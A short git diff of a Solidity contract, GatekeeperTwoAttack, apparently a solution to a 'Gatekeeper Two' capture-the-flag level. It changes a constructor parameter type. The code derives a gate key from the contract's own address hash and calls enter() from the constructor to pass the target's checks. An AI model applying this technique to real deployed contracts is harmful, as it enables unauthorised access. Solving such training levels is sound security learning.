@@ -6,10 +6,10 @@ interface IGatekeeperTwo {
 }
 
 contract GatekeeperTwoAttack {
-    constructor(address _target) {
+    constructor(IGatekeeperTwo _target) {
         bytes8 _gateKey = bytes8(
             uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(type(uint64).max)
         );
-        IGatekeeperTwo(_target).enter(_gateKey);
+        _target.enter(_gateKey);
     }
 }
